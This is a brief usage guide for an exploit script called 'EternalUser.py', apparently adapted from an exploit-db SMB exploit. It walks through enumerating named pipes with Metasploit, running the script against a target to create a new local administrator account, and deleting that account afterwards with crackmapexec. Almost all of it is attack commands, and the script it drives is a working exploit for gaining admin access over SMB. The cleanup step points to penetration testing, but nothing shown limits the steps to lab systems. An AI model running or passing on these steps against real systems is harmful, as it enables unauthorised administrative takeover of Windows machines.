Exploit tweaked from https://www.exploit-db.com/exploits/42315

1. Enumerate pipes
```
msfconsole 
auxiliary/scanner/smb/pipe_auditor
```

2. Edit the 4 blank variables at the beginning of the exploit code 

3. Run to a add new local admin account
```
python2.7 ./EternalUser.py [target] [pipe]
```

4. Remove created local admin once finished
```
crackmapexec smb 192.168.4.29  -u 'z'  -p 'x' --local-auth -x "net user /delete z"
```
